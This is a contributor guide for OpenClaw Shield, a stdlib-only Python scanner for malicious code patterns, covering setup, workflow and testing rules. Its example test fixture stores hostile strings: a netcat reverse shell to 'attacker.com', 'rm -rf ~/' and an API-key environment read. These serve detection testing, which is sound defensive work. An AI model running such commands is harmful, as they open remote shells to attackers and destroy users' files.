# Contributing to OpenClaw Shield

Thank you for your interest in contributing to OpenClaw Shield. As a Tier-0 security control, contributions must meet high standards for code quality, security, and auditability.

---

## 1. Code of Conduct

- Be respectful and professional
- Focus on constructive feedback
- Prioritize security over features
- Document your changes thoroughly

---

## 2. Before Contributing

### 2.1 Read First
- [ ] `README.md` — Understand the project
- [ ] `THREAT_MODEL.md` — Understand what we protect against
- [ ] `SECURITY.md` — Understand our security posture

### 2.2 Constraints
OpenClaw Shield has strict requirements:

| Requirement | Reason |
|-------------|--------|
| **Python stdlib only** | No external dependencies, no supply chain risk |
| **Python 3.9+** | Minimum supported version |
| **No auto-execution** | Human approval required for all deployments |
| **Deterministic detection** | No ML/AI, regex and correlation only |
| **Full test coverage** | All detection patterns must have tests |

---

## 3. Types of Contributions

### 3.1 Welcome
- ✅ New detection patterns (with tests and documentation)
- ✅ Bug fixes (with regression tests)
- ✅ Documentation improvements
- ✅ Test coverage improvements
- ✅ Performance optimizations (that maintain readability)

### 3.2 Requires Discussion First
- ⚠️ New file types to scan
- ⚠️ Changes to severity classifications
- ⚠️ Architectural changes
- ⚠️ New runtime guard features

### 3.3 Not Accepted
- ❌ External dependencies
- ❌ Auto-commit/auto-push features
- ❌ ML-based detection
- ❌ Features that reduce auditability

---

## 4. Development Setup

### 4.1 Clone and Setup

```bash
git clone https://github.com/pfaria32/OpenClaw-Shield.git
cd OpenClaw-Shield

# No dependencies to install — stdlib only!
# Verify Python version
python3 --version  # Must be 3.9+
```

### 4.2 Run Tests

```bash
# Run all tests
python3 -m pytest tests/ -v

# Run specific test
python3 -m pytest tests/test_shield_scan.py -v

# Run with coverage (if pytest-cov available)
python3 -m pytest tests/ --cov=. --cov-report=html
```

### 4.3 Run Static Scanner

```bash
# Scan a directory
python3 shield_scan.py /path/to/scan

# Output is JSON to stdout
python3 shield_scan.py /path/to/scan > report.json
```

---

## 5. Contribution Workflow

### 5.1 For Bug Fixes

1. Open an issue describing the bug
2. Fork the repository
3. Create a branch: `fix/brief-description`
4. Write a failing test that reproduces the bug
5. Fix the bug
6. Ensure all tests pass
7. Submit a pull request

### 5.2 For New Detection Patterns

1. Open an issue proposing the pattern
2. Include:
   - Attack vector description
   - Example malicious code (as text, not executable)
   - Proposed regex pattern
   - Severity classification rationale
3. Wait for maintainer approval
4. Fork and create branch: `detect/pattern-name`
5. Implement pattern in `shield_scan.py`
6. Add test fixture in `tests/fixtures/`
7. Add test case in `tests/test_shield_scan.py`
8. Update `THREAT_MODEL.md` if needed
9. Submit pull request

### 5.3 For Documentation

1. Fork the repository
2. Create branch: `docs/description`
3. Make changes
4. Submit pull request

---

## 6. Code Standards

### 6.1 Style

```python
# Use type hints
def scan_file(path: Path) -> List[Finding]:
    ...

# Use dataclasses for structured data
@dataclass
class Finding:
    file: str
    line: int
    pattern: str
    severity: str
    description: str
    code_snippet: str

# Document complex logic
def _correlation_check(findings: List[Finding]) -> List[Finding]:
    """
    Check for correlated findings that indicate higher severity.
    
    Example: env var read + network call in same file = possible exfil
    """
    ...
```

### 6.2 Naming

- Files: `snake_case.py`
- Classes: `PascalCase`
- Functions: `snake_case`
- Constants: `UPPER_SNAKE_CASE`
- Private: `_leading_underscore`

### 6.3 Testing

Every detection pattern MUST have:

```python
def test_pattern_name_detected():
    """Pattern X should detect attack Y."""
    # Use safe fixture that contains pattern in comment/string
    findings = scan_file(FIXTURES / "suspicious_file.py")
    assert any(f.pattern == "pattern_name" for f in findings)

def test_pattern_name_severity():
    """Pattern X should have correct severity."""
    findings = scan_file(FIXTURES / "suspicious_file.py")
    finding = next(f for f in findings if f.pattern == "pattern_name")
    assert finding.severity == "high"
```

---

## 7. Security Considerations for Contributors

### 7.1 Test Fixtures

**DO:**
- Put malicious patterns in comments or strings
- Mark files clearly as test fixtures
- Use obviously fake credentials

**DON'T:**
- Create executable malware
- Use real credentials (even expired ones)
- Create files that could cause harm if run

### 7.2 Example Safe Fixture

```python
# tests/fixtures/suspicious_strings.py
"""
Test fixture containing suspicious patterns for scanner testing.
THIS FILE IS INTENTIONALLY SUSPICIOUS - DO NOT EXECUTE.
All patterns are in strings/comments only.
"""

# Pattern: env_secret_read
ENV_EXAMPLE = "os.environ.get('OPENAI_API_KEY')"

# Pattern: destructive_rm_rf  
RM_EXAMPLE = "rm -rf ~/"

# Pattern: reverse_shell
SHELL_EXAMPLE = "nc -e /bin/bash attacker.com 4444"
```

### 7.3 Pull Request Checklist

Before submitting:

- [ ] All tests pass locally
- [ ] No external dependencies added
- [ ] Changes documented in code comments
- [ ] THREAT_MODEL.md updated if new attack vector
- [ ] Test fixtures are safe (non-executable)
- [ ] Severity classification is justified
- [ ] No secrets or credentials in code

---

## 8. Review Process

### 8.1 Review Criteria

All PRs are reviewed for:

1. **Correctness:** Does it work as intended?
2. **Security:** Does it introduce vulnerabilities?
3. **Testing:** Is it adequately tested?
4. **Auditability:** Is the code readable?
5. **Constraints:** Does it follow project rules?

### 8.2 Timeline

- Initial response: 3-5 business days
- Review cycles: Varies by complexity
- Merge: After approval + passing CI

---

## 9. License

By contributing, you agree that your contributions will be licensed under the same license as the project.

---

## 10. Questions?

- Open a GitHub issue for general questions
- See `SECURITY.md` for security-related questions
- Check existing issues before creating new ones

---

*Thank you for helping make OpenClaw Shield more secure!*
